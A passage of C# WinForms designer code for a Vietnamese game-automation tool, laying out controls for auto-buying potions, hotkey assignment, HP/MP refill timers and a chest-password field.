		this.textBoxOso2.TextChanged += new System.EventHandler(textBoxOso2_TextChanged);
		this.textBoxOso3.ForeColor = System.Drawing.Color.DarkGreen;
		this.textBoxOso3.Location = new System.Drawing.Point(138, 67);
		this.textBoxOso3.Name = "textBoxOso3";
		this.textBoxOso3.Size = new System.Drawing.Size(47, 20);
		this.textBoxOso3.TabIndex = 336;
		this.textBoxOso3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.textBoxOso3.TextChanged += new System.EventHandler(textBoxOso3_TextChanged);
		this.label20.AutoSize = true;
		this.label20.Location = new System.Drawing.Point(2, 71);
		this.label20.Name = "label20";
		this.label20.Size = new System.Drawing.Size(116, 13);
		this.label20.TabIndex = 343;
		this.label20.Text = "Gán Mua3 vào ô số =>";
		this.richTextBox1.Location = new System.Drawing.Point(3, 93);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(185, 116);
		this.richTextBox1.TabIndex = 340;
		this.richTextBox1.Text = "Tự gán thuốc vào ô phím tắt dưới khung chat của game.\n\nNhập số thứ tự của ô tắt trong game vào ô xanh lá cây của auto, còn nếu bỏ qua thì ghi số 0";
		this.label19.AutoSize = true;
		this.label19.Location = new System.Drawing.Point(2, 48);
		this.label19.Name = "label19";
		this.label19.Size = new System.Drawing.Size(116, 13);
		this.label19.TabIndex = 342;
		this.label19.Text = "Gán Mua2 vào ô số =>";
		this.label10.AutoSize = true;
		this.label10.Location = new System.Drawing.Point(2, 27);
		this.label10.Name = "label10";
		this.label10.Size = new System.Drawing.Size(116, 13);
		this.label10.TabIndex = 341;
		this.label10.Text = "Gán Mua1 vào ô số =>";
		this.checkBoxGanTenthuoc.AutoSize = true;
		this.checkBoxGanTenthuoc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxGanTenthuoc.ForeColor = System.Drawing.Color.DarkGreen;
		this.checkBoxGanTenthuoc.Location = new System.Drawing.Point(6, 6);
		this.checkBoxGanTenthuoc.Name = "checkBoxGanTenthuoc";
		this.checkBoxGanTenthuoc.Size = new System.Drawing.Size(182, 17);
		this.checkBoxGanTenthuoc.TabIndex = 337;
		this.checkBoxGanTenthuoc.Text = "Tự động gán ô tắt khi mua thuốc";
		this.checkBoxGanTenthuoc.UseVisualStyleBackColor = true;
		this.checkBoxGanTenthuoc.CheckedChanged += new System.EventHandler(checkBoxGanTenthuoc_CheckedChanged);
		this.checkBoxMua1.AutoSize = true;
		this.checkBoxMua1.ForeColor = System.Drawing.Color.DarkBlue;
		this.checkBoxMua1.Location = new System.Drawing.Point(3, 91);
		this.checkBoxMua1.Name = "checkBoxMua1";
		this.checkBoxMua1.Size = new System.Drawing.Size(61, 19);
		this.checkBoxMua1.TabIndex = 10;
		this.checkBoxMua1.Text = "Mua 1";
		this.checkBoxMua1.UseVisualStyleBackColor = true;
		this.checkBoxMua1.CheckedChanged += new System.EventHandler(checkBoxMua1_CheckedChanged);
		this.buttonBungTuimau.BackColor = System.Drawing.Color.Aquamarine;
		this.buttonBungTuimau.ForeColor = System.Drawing.Color.Red;
		this.buttonBungTuimau.Location = new System.Drawing.Point(99, 215);
		this.buttonBungTuimau.Name = "buttonBungTuimau";
		this.buttonBungTuimau.Size = new System.Drawing.Size(95, 23);
		this.buttonBungTuimau.TabIndex = 330;
		this.buttonBungTuimau.Text = "Tự mở túi thuốc";
		this.buttonBungTuimau.UseVisualStyleBackColor = false;
		this.buttonBungTuimau.Click += new System.EventHandler(buttonBungTuimau_Click);
		this.textBoxSoluongThuocDimua.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongThuocDimua.Location = new System.Drawing.Point(152, 71);
		this.textBoxSoluongThuocDimua.Name = "textBoxSoluongThuocDimua";
		this.textBoxSoluongThuocDimua.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongThuocDimua.TabIndex = 138;
		this.textBoxSoluongThuocDimua.TextChanged += new System.EventHandler(textBoxSoluongThuocDimua_TextChanged);
		this.comboBoxMua2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxMua2.DropDownWidth = 180;
		this.comboBoxMua2.ForeColor = System.Drawing.Color.Black;
		this.comboBoxMua2.FormattingEnabled = true;
		this.comboBoxMua2.Location = new System.Drawing.Point(11, 151);
		this.comboBoxMua2.Name = "comboBoxMua2";
		this.comboBoxMua2.Size = new System.Drawing.Size(123, 23);
		this.comboBoxMua2.TabIndex = 12;
		this.comboBoxMua2.SelectedIndexChanged += new System.EventHandler(comboBoxMua2_SelectedIndexChanged);
		this.comboBoxMua2.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxMua2_MouseDown);
		this.buttonComboNhoithuoc.BackColor = System.Drawing.Color.Lime;
		this.buttonComboNhoithuoc.ForeColor = System.Drawing.Color.Red;
		this.buttonComboNhoithuoc.Location = new System.Drawing.Point(3, 215);
		this.buttonComboNhoithuoc.Name = "buttonComboNhoithuoc";
		this.buttonComboNhoithuoc.Size = new System.Drawing.Size(95, 23);
		this.buttonComboNhoithuoc.TabIndex = 193;
		this.buttonComboNhoithuoc.Text = "Nhồi thuốc";
		this.buttonComboNhoithuoc.UseVisualStyleBackColor = false;
		this.buttonComboNhoithuoc.Click += new System.EventHandler(buttonComboNhoithuoc_Click);
		this.checkBoxMangtheotien.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMangtheotien.Location = new System.Drawing.Point(4, 5);
		this.checkBoxMangtheotien.Name = "checkBoxMangtheotien";
		this.checkBoxMangtheotien.Size = new System.Drawing.Size(128, 19);
		this.checkBoxMangtheotien.TabIndex = 151;
		this.checkBoxMangtheotien.Text = "Đem tiền =>";
		this.checkBoxMangtheotien.UseVisualStyleBackColor = true;
		this.checkBoxMangtheotien.CheckedChanged += new System.EventHandler(checkBoxMangtheotien_CheckedChanged);
		this.comboBoxMua1.BackColor = System.Drawing.SystemColors.Info;
		this.comboBoxMua1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxMua1.DropDownWidth = 180;
		this.comboBoxMua1.ForeColor = System.Drawing.Color.Black;
		this.comboBoxMua1.FormattingEnabled = true;
		this.comboBoxMua1.Location = new System.Drawing.Point(11, 110);
		this.comboBoxMua1.Name = "comboBoxMua1";
		this.comboBoxMua1.Size = new System.Drawing.Size(123, 23);
		this.comboBoxMua1.TabIndex = 9;
		this.comboBoxMua1.SelectedIndexChanged += new System.EventHandler(comboBoxMua1_SelectedIndexChanged);
		this.comboBoxMua1.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxMua1_MouseDown);
		this.textBoxSoluongTDP.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongTDP.Location = new System.Drawing.Point(136, 49);
		this.textBoxSoluongTDP.Name = "textBoxSoluongTDP";
		this.textBoxSoluongTDP.Size = new System.Drawing.Size(51, 21);
		this.textBoxSoluongTDP.TabIndex = 143;
		this.textBoxSoluongTDP.TextChanged += new System.EventHandler(textBoxSoluongTDP_TextChanged);
		this.textBoxPass.ForeColor = System.Drawing.Color.Black;
		this.textBoxPass.Location = new System.Drawing.Point(135, 25);
		this.textBoxPass.Name = "textBoxPass";
		this.textBoxPass.PasswordChar = '*';
		this.textBoxPass.Size = new System.Drawing.Size(52, 21);
		this.textBoxPass.TabIndex = 153;
		this.textBoxPass.TextChanged += new System.EventHandler(textBoxPass_TextChanged);
		this.comboBoxMuaGiaiDoc.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxMuaGiaiDoc.DropDownWidth = 180;
		this.comboBoxMuaGiaiDoc.ForeColor = System.Drawing.Color.Black;
		this.comboBoxMuaGiaiDoc.FormattingEnabled = true;
		this.comboBoxMuaGiaiDoc.Location = new System.Drawing.Point(11, 191);
		this.comboBoxMuaGiaiDoc.Name = "comboBoxMuaGiaiDoc";
		this.comboBoxMuaGiaiDoc.Size = new System.Drawing.Size(121, 23);
		this.comboBoxMuaGiaiDoc.TabIndex = 194;
		this.comboBoxMuaGiaiDoc.SelectedIndexChanged += new System.EventHandler(comboBoxMuaGiaiDoc_SelectedIndexChanged);
		this.comboBoxMuaGiaiDoc.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxMuaGiaiDoc_MouseDown);
		this.label12.AutoSize = true;
		this.label12.ForeColor = System.Drawing.Color.Red;
		this.label12.Location = new System.Drawing.Point(-1, 74);
		this.label12.Name = "label12";
		this.label12.Size = new System.Drawing.Size(199, 15);
		this.label12.TabIndex = 347;
		this.label12.Text = "Mua thuốc khi túi còn ít hơn           bi";
		this.label12.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.checkBoxMuaTDP.AutoSize = true;
		this.checkBoxMuaTDP.ForeColor = System.Drawing.Color.Red;
		this.checkBoxMuaTDP.Location = new System.Drawing.Point(3, 52);
		this.checkBoxMuaTDP.Name = "checkBoxMuaTDP";
		this.checkBoxMuaTDP.Size = new System.Drawing.Size(136, 19);
		this.checkBoxMuaTDP.TabIndex = 142;
		this.checkBoxMuaTDP.Text = "Mua Thổ địa phù =>";
		this.checkBoxMuaTDP.UseVisualStyleBackColor = true;
		this.checkBoxMuaTDP.CheckedChanged += new System.EventHandler(checkBoxMuaTDP_CheckedChanged);
		this.buttonMuathuocBaovat.BackColor = System.Drawing.SystemColors.Control;
		this.buttonMuathuocBaovat.ForeColor = System.Drawing.Color.Black;
		this.buttonMuathuocBaovat.Location = new System.Drawing.Point(278, 239);
		this.buttonMuathuocBaovat.Name = "buttonMuathuocBaovat";
		this.buttonMuathuocBaovat.Size = new System.Drawing.Size(110, 28);
		this.buttonMuathuocBaovat.TabIndex = 342;
		this.buttonMuathuocBaovat.Text = "Tất cả mua bảo vật";
		this.buttonMuathuocBaovat.UseVisualStyleBackColor = false;
		this.buttonMuathuocBaovat.Click += new System.EventHandler(buttonMuathuocBaovat_Click);
		this.textBoxTienMangtheo.ForeColor = System.Drawing.Color.Black;
		this.textBoxTienMangtheo.Location = new System.Drawing.Point(135, 3);
		this.textBoxTienMangtheo.Name = "textBoxTienMangtheo";
		this.textBoxTienMangtheo.Size = new System.Drawing.Size(52, 21);
		this.textBoxTienMangtheo.TabIndex = 140;
		this.textBoxTienMangtheo.TextChanged += new System.EventHandler(textBoxTienMangtheo_TextChanged);
		this.checkBoxMuaKTC.AutoSize = true;
		this.checkBoxMuaKTC.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMuaKTC.Location = new System.Drawing.Point(145, 245);
		this.checkBoxMuaKTC.Name = "checkBoxMuaKTC";
		this.checkBoxMuaKTC.Size = new System.Drawing.Size(61, 19);
		this.checkBoxMuaKTC.TabIndex = 378;
		this.checkBoxMuaKTC.Text = "Mua ở";
		this.checkBoxMuaKTC.UseVisualStyleBackColor = true;
		this.checkBoxMuaKTC.CheckedChanged += new System.EventHandler(checkBoxMuaKTC_CheckedChanged);
		this.label4.AutoSize = true;
		this.label4.ForeColor = System.Drawing.Color.Black;
		this.label4.Location = new System.Drawing.Point(12, 28);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(117, 15);
		this.label4.TabIndex = 152;
		this.label4.Text = "nhập Pass rương =>";
		this.buttonKyTranCac.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonKyTranCac.ForeColor = System.Drawing.Color.Red;
		this.buttonKyTranCac.Location = new System.Drawing.Point(210, 239);
		this.buttonKyTranCac.Name = "buttonKyTranCac";
		this.buttonKyTranCac.Size = new System.Drawing.Size(65, 27);
		this.buttonKyTranCac.TabIndex = 379;
		this.buttonKyTranCac.Text = "Bảo vật";
		this.buttonKyTranCac.UseVisualStyleBackColor = false;
		this.buttonKyTranCac.Click += new System.EventHandler(buttonKyTranCac_Click);
		this.checkBoxMuaGiaiDoc.AutoSize = true;
		this.checkBoxMuaGiaiDoc.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMuaGiaiDoc.Location = new System.Drawing.Point(4, 174);
		this.checkBoxMuaGiaiDoc.Name = "checkBoxMuaGiaiDoc";
		this.checkBoxMuaGiaiDoc.Size = new System.Drawing.Size(61, 19);
		this.checkBoxMuaGiaiDoc.TabIndex = 195;
		this.checkBoxMuaGiaiDoc.Text = "Mua 3";
		this.checkBoxMuaGiaiDoc.UseVisualStyleBackColor = true;
		this.checkBoxMuaGiaiDoc.CheckedChanged += new System.EventHandler(checkBoxMuaGiaiDoc_CheckedChanged);
		this.checkBoxMua2.AutoSize = true;
		this.checkBoxMua2.ForeColor = System.Drawing.Color.Black;
		this.checkBoxMua2.Location = new System.Drawing.Point(4, 134);
		this.checkBoxMua2.Name = "checkBoxMua2";
		this.checkBoxMua2.Size = new System.Drawing.Size(61, 19);
		this.checkBoxMua2.TabIndex = 13;
		this.checkBoxMua2.Text = "Mua 2";
		this.checkBoxMua2.UseVisualStyleBackColor = true;
		this.checkBoxMua2.CheckedChanged += new System.EventHandler(checkBoxMua2_CheckedChanged);
		this.textBoxSoluong1.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluong1.Location = new System.Drawing.Point(138, 111);
		this.textBoxSoluong1.Name = "textBoxSoluong1";
		this.textBoxSoluong1.Size = new System.Drawing.Size(48, 21);
		this.textBoxSoluong1.TabIndex = 11;
		this.textBoxSoluong1.TextChanged += new System.EventHandler(textBoxSoluong1_TextChanged);
		this.textBoxSoluongMuaGiaiDoc.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongMuaGiaiDoc.Location = new System.Drawing.Point(138, 191);
		this.textBoxSoluongMuaGiaiDoc.Name = "textBoxSoluongMuaGiaiDoc";
		this.textBoxSoluongMuaGiaiDoc.Size = new System.Drawing.Size(48, 21);
		this.textBoxSoluongMuaGiaiDoc.TabIndex = 196;
		this.textBoxSoluongMuaGiaiDoc.TextChanged += new System.EventHandler(textBoxSoluongMuaGiaiDoc_TextChanged);
		this.textBoxSoluong2.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluong2.Location = new System.Drawing.Point(138, 152);
		this.textBoxSoluong2.Name = "textBoxSoluong2";
		this.textBoxSoluong2.Size = new System.Drawing.Size(48, 21);
		this.textBoxSoluong2.TabIndex = 14;
		this.textBoxSoluong2.TextChanged += new System.EventHandler(textBoxSoluong2_TextChanged);
		this.tabPagePhuchoi.Controls.Add(this.label55);
		this.tabPagePhuchoi.Controls.Add(this.comboBoxSelectOverlayItemCount);
		this.tabPagePhuchoi.Controls.Add(this.label53);
		this.tabPagePhuchoi.Controls.Add(this.textBoxtimettl);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxTTL);
		this.tabPagePhuchoi.Controls.Add(this.comboBoxPk);
		this.tabPagePhuchoi.Controls.Add(this.textBox3);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxUuTienBomCuuchuyen);
		this.tabPagePhuchoi.Controls.Add(this.textBox2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxMPTdp);
		this.tabPagePhuchoi.Controls.Add(this.textBox1);
		this.tabPagePhuchoi.Controls.Add(this.textBoxHpTDP);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxMana2);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxMau2);
		this.tabPagePhuchoi.Controls.Add(this.comboBoxTenMana2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxTimerMana2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxRatioMana2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoluongMana2);
		this.tabPagePhuchoi.Controls.Add(this.comboBoxTenMau2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoluongMau2);
		this.tabPagePhuchoi.Controls.Add(this.textBoxTimerMau2);
		this.tabPagePhuchoi.Controls.Add(this.buttonAppDungBomMauAll);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxVeThanhKhiPKlon);
		this.tabPagePhuchoi.Controls.Add(this.textBoxRatioMau2);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxMPTdp);
		this.tabPagePhuchoi.Controls.Add(this.textBoxTDP_SL_Mana);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoluongBomMagic);
		this.tabPagePhuchoi.Controls.Add(this.textBoxTimerBomMagic);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxTuGiaidoc);
		this.tabPagePhuchoi.Controls.Add(this.textBoxTDP_SL_Mau);
		this.tabPagePhuchoi.Controls.Add(this.buttonGiaiThichHaucan);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxTDP_SL_Mana);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxTDP_SL_Mau);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxMPBom);
		this.tabPagePhuchoi.Controls.Add(this.textBoxThoiGianBomHPDiem);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoluongBomHP);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxHPTdp);
		this.tabPagePhuchoi.Controls.Add(this.textBoxThoigianBomMP);
		this.tabPagePhuchoi.Controls.Add(this.textBoxThoigianBomHP);
		this.tabPagePhuchoi.Controls.Add(this.textBoxBomHPDiem);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxBomHPDiem);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoLuongBomHPDiem);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxBomHP);
		this.tabPagePhuchoi.Controls.Add(this.textBoxMPBom);
		this.tabPagePhuchoi.Controls.Add(this.textBoxBomMPDiem);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoLuongBomMPDiem);
		this.tabPagePhuchoi.Controls.Add(this.checkBoxBomMPDiem);
		this.tabPagePhuchoi.Controls.Add(this.textBoxThoiGianBomMPDiem);
		this.tabPagePhuchoi.Controls.Add(this.textBoxHPBom);
		this.tabPagePhuchoi.Controls.Add(this.textBoxSoluongBomMP);
		this.tabPagePhuchoi.Location = new System.Drawing.Point(4, 24);
		this.tabPagePhuchoi.Name = "tabPagePhuchoi";
		this.tabPagePhuchoi.Padding = new System.Windows.Forms.Padding(3);
		this.tabPagePhuchoi.Size = new System.Drawing.Size(390, 266);
		this.tabPagePhuchoi.TabIndex = 2;
		this.tabPagePhuchoi.Text = "Phục hồi";
		this.tabPagePhuchoi.UseVisualStyleBackColor = true;
		this.label55.AutoSize = true;
		this.label55.Location = new System.Drawing.Point(243, 161);
		this.label55.Name = "label55";
		this.label55.Size = new System.Drawing.Size(86, 15);
		this.label55.TabIndex = 395;
		this.label55.Text = "Hiển Thị Item :";
		this.comboBoxSelectOverlayItemCount.FormattingEnabled = true;
		this.comboBoxSelectOverlayItemCount.Location = new System.Drawing.Point(329, 158);
		this.comboBoxSelectOverlayItemCount.Name = "comboBoxSelectOverlayItemCount";
		this.comboBoxSelectOverlayItemCount.Size = new System.Drawing.Size(57, 23);
		this.comboBoxSelectOverlayItemCount.TabIndex = 394;
		this.comboBoxSelectOverlayItemCount.SelectedIndexChanged += new System.EventHandler(comboBoxSelectOverlayItemCount_SelectedIndexChanged);
		this.label53.AutoSize = true;
		this.label53.Location = new System.Drawing.Point(205, 229);
		this.label53.Name = "label53";
		this.label53.Size = new System.Drawing.Size(32, 15);
		this.label53.TabIndex = 393;
		this.label53.Text = "Phút";
		this.textBoxtimettl.Location = new System.Drawing.Point(166, 225);
		this.textBoxtimettl.Name = "textBoxtimettl";
		this.textBoxtimettl.Size = new System.Drawing.Size(37, 21);
		this.textBoxtimettl.TabIndex = 392;
		this.textBoxtimettl.TextChanged += new System.EventHandler(textBoxtimettl_TextChanged);
		this.checkBoxTTL.AutoSize = true;
		this.checkBoxTTL.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTTL.Location = new System.Drawing.Point(3, 227);
		this.checkBoxTTL.Name = "checkBoxTTL";
		this.checkBoxTTL.Size = new System.Drawing.Size(155, 19);
		this.checkBoxTTL.TabIndex = 269;
		this.checkBoxTTL.Text = "Đớp Tiên thảo lộ x2 sau";
		this.checkBoxTTL.UseVisualStyleBackColor = true;
		this.checkBoxTTL.CheckedChanged += new System.EventHandler(checkBoxTTL_CheckedChanged);
		this.comboBoxPk.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxPk.FormattingEnabled = true;
		this.comboBoxPk.Location = new System.Drawing.Point(166, 199);
		this.comboBoxPk.Name = "comboBoxPk";
		this.comboBoxPk.Size = new System.Drawing.Size(71, 23);
		this.comboBoxPk.TabIndex = 391;
		this.comboBoxPk.SelectedIndexChanged += new System.EventHandler(comboBoxPk_SelectedIndexChanged);
		this.textBox3.BackColor = System.Drawing.Color.Gold;
		this.textBox3.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBox3.ForeColor = System.Drawing.Color.Black;
		this.textBox3.Location = new System.Drawing.Point(121, 0);
		this.textBox3.Name = "textBox3";
		this.textBox3.ReadOnly = true;
		this.textBox3.Size = new System.Drawing.Size(39, 14);
		this.textBox3.TabIndex = 390;
		this.textBox3.Text = "tỉ lệ %";
		this.textBox3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.textBox3.TextChanged += new System.EventHandler(textBox3_TextChanged);
		this.checkBoxUuTienBomCuuchuyen.AutoSize = true;
		this.checkBoxUuTienBomCuuchuyen.ForeColor = System.Drawing.Color.Black;
		this.checkBoxUuTienBomCuuchuyen.Location = new System.Drawing.Point(20, 59);
		this.checkBoxUuTienBomCuuchuyen.Name = "checkBoxUuTienBomCuuchuyen";
		this.checkBoxUuTienBomCuuchuyen.Size = new System.Drawing.Size(256, 19);
		this.checkBoxUuTienBomCuuchuyen.TabIndex = 340;
		this.checkBoxUuTienBomCuuchuyen.Text = "Ưu tiên bơm thuốc Cửu Chuyển hoàn trước";
		this.checkBoxUuTienBomCuuchuyen.UseVisualStyleBackColor = true;
		this.checkBoxUuTienBomCuuchuyen.CheckedChanged += new System.EventHandler(checkBoxUuTienBomCuuchuyen_CheckedChanged);
		this.textBox2.BackColor = System.Drawing.Color.Chartreuse;
		this.textBox2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBox2.ForeColor = System.Drawing.Color.Black;
		this.textBox2.Location = new System.Drawing.Point(165, -1);
		this.textBox2.Name = "textBox2";
		this.textBox2.ReadOnly = true;
		this.textBox2.Size = new System.Drawing.Size(38, 14);
		this.textBox2.TabIndex = 389;
		this.textBox2.Text = "miligiây";
		this.textBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.textBoxMPTdp.ForeColor = System.Drawing.Color.DarkBlue;
		this.textBoxMPTdp.Location = new System.Drawing.Point(356, 127);
		this.textBoxMPTdp.Name = "textBoxMPTdp";
		this.textBoxMPTdp.Size = new System.Drawing.Size(30, 21);
		this.textBoxMPTdp.TabIndex = 128;
		this.textBoxMPTdp.TextChanged += new System.EventHandler(textBoxMPTdp_TextChanged);
		this.textBox1.BackColor = System.Drawing.SystemColors.WindowFrame;
		this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.textBox1.ForeColor = System.Drawing.Color.SeaShell;
		this.textBox1.Location = new System.Drawing.Point(207, 0);
		this.textBox1.Name = "textBox1";
		this.textBox1.ReadOnly = true;
		this.textBox1.Size = new System.Drawing.Size(28, 14);
		this.textBox1.TabIndex = 388;
		this.textBox1.Text = "Bình";
		this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.textBoxHpTDP.ForeColor = System.Drawing.Color.DarkBlue;
		this.textBoxHpTDP.Location = new System.Drawing.Point(356, 37);
		this.textBoxHpTDP.Name = "textBoxHpTDP";
		this.textBoxHpTDP.Size = new System.Drawing.Size(30, 21);
		this.textBoxHpTDP.TabIndex = 37;
		this.textBoxHpTDP.TextChanged += new System.EventHandler(textBoxHpTDP_TextChanged);
		this.checkBoxMana2.AutoSize = true;
		this.checkBoxMana2.Location = new System.Drawing.Point(10, 153);
		this.checkBoxMana2.Name = "checkBoxMana2";
		this.checkBoxMana2.Size = new System.Drawing.Size(15, 14);
		this.checkBoxMana2.TabIndex = 339;
		this.checkBoxMana2.UseVisualStyleBackColor = true;
		this.checkBoxMana2.CheckedChanged += new System.EventHandler(checkBoxMana2_CheckedChanged);
		this.checkBoxMau2.AutoSize = true;
		this.checkBoxMau2.Location = new System.Drawing.Point(9, 82);
		this.checkBoxMau2.Name = "checkBoxMau2";
		this.checkBoxMau2.Size = new System.Drawing.Size(15, 14);
		this.checkBoxMau2.TabIndex = 338;
		this.checkBoxMau2.UseVisualStyleBackColor = true;
		this.checkBoxMau2.CheckedChanged += new System.EventHandler(checkBoxMau2_CheckedChanged);
		this.comboBoxTenMana2.DropDownWidth = 180;
		this.comboBoxTenMana2.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTenMana2.FormattingEnabled = true;
		this.comboBoxTenMana2.Location = new System.Drawing.Point(27, 149);
		this.comboBoxTenMana2.Name = "comboBoxTenMana2";
		this.comboBoxTenMana2.Size = new System.Drawing.Size(89, 23);
		this.comboBoxTenMana2.TabIndex = 337;
		this.comboBoxTenMana2.SelectedIndexChanged += new System.EventHandler(comboBoxTenMana2_SelectedIndexChanged);
		this.comboBoxTenMana2.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTenMana2_MouseDown);
		this.textBoxTimerMana2.ForeColor = System.Drawing.Color.Black;
		this.textBoxTimerMana2.Location = new System.Drawing.Point(166, 150);
		this.textBoxTimerMana2.Name = "textBoxTimerMana2";
		this.textBoxTimerMana2.Size = new System.Drawing.Size(38, 21);
		this.textBoxTimerMana2.TabIndex = 335;
		this.textBoxTimerMana2.TextChanged += new System.EventHandler(textBoxTimerMana2_TextChanged);
		this.textBoxRatioMana2.ForeColor = System.Drawing.Color.Black;
		this.textBoxRatioMana2.Location = new System.Drawing.Point(127, 150);
		this.textBoxRatioMana2.Name = "textBoxRatioMana2";
		this.textBoxRatioMana2.Size = new System.Drawing.Size(38, 21);
		this.textBoxRatioMana2.TabIndex = 334;
		this.textBoxRatioMana2.TextChanged += new System.EventHandler(textBoxRatioMana2_TextChanged);
		this.textBoxSoluongMana2.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongMana2.Location = new System.Drawing.Point(207, 150);
		this.textBoxSoluongMana2.Name = "textBoxSoluongMana2";
		this.textBoxSoluongMana2.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongMana2.TabIndex = 336;
		this.textBoxSoluongMana2.TextChanged += new System.EventHandler(textBoxSoluongMana2_TextChanged);
		this.comboBoxTenMau2.BackColor = System.Drawing.SystemColors.Info;
		this.comboBoxTenMau2.DropDownWidth = 180;
		this.comboBoxTenMau2.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTenMau2.FormattingEnabled = true;
		this.comboBoxTenMau2.Location = new System.Drawing.Point(25, 78);
		this.comboBoxTenMau2.Name = "comboBoxTenMau2";
		this.comboBoxTenMau2.Size = new System.Drawing.Size(91, 23);
		this.comboBoxTenMau2.TabIndex = 332;
		this.comboBoxTenMau2.SelectedIndexChanged += new System.EventHandler(comboBoxTenMau2_SelectedIndexChanged);
		this.comboBoxTenMau2.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTenMau2_MouseDown);
		this.textBoxSoluongMau2.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxSoluongMau2.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongMau2.Location = new System.Drawing.Point(207, 78);
		this.textBoxSoluongMau2.Name = "textBoxSoluongMau2";
		this.textBoxSoluongMau2.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongMau2.TabIndex = 317;
		this.textBoxSoluongMau2.TextChanged += new System.EventHandler(textBoxSoluongMau2_TextChanged);
		this.textBoxTimerMau2.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxTimerMau2.ForeColor = System.Drawing.Color.Black;
		this.textBoxTimerMau2.Location = new System.Drawing.Point(166, 78);
		this.textBoxTimerMau2.Name = "textBoxTimerMau2";
		this.textBoxTimerMau2.Size = new System.Drawing.Size(38, 21);
		this.textBoxTimerMau2.TabIndex = 316;
		this.textBoxTimerMau2.TextChanged += new System.EventHandler(textBoxTimerMau2_TextChanged);
		this.buttonAppDungBomMauAll.BackColor = System.Drawing.SystemColors.Control;
		this.buttonAppDungBomMauAll.ForeColor = System.Drawing.Color.Red;
		this.buttonAppDungBomMauAll.Location = new System.Drawing.Point(241, 187);
		this.buttonAppDungBomMauAll.Name = "buttonAppDungBomMauAll";
		this.buttonAppDungBomMauAll.Size = new System.Drawing.Size(146, 30);
		this.buttonAppDungBomMauAll.TabIndex = 194;
		this.buttonAppDungBomMauAll.Text = "Áp dụng tất cả ac";
		this.buttonAppDungBomMauAll.UseVisualStyleBackColor = false;
		this.buttonAppDungBomMauAll.Click += new System.EventHandler(buttonAppDungBomMauAll_Click);
		this.checkBoxVeThanhKhiPKlon.AutoSize = true;
		this.checkBoxVeThanhKhiPKlon.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxVeThanhKhiPKlon.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxVeThanhKhiPKlon.ForeColor = System.Drawing.Color.Red;
		this.checkBoxVeThanhKhiPKlon.Location = new System.Drawing.Point(3, 205);
		this.checkBoxVeThanhKhiPKlon.Name = "checkBoxVeThanhKhiPKlon";
		this.checkBoxVeThanhKhiPKlon.Size = new System.Drawing.Size(155, 17);
		this.checkBoxVeThanhKhiPKlon.TabIndex = 308;
		this.checkBoxVeThanhKhiPKlon.Text = "Về ở thành khi giá trị pk lớn";
		this.checkBoxVeThanhKhiPKlon.UseVisualStyleBackColor = false;
		this.checkBoxVeThanhKhiPKlon.CheckedChanged += new System.EventHandler(checkBoxVeThanhKhiPKlon_CheckedChanged);
		this.textBoxRatioMau2.BackColor = System.Drawing.SystemColors.Info;
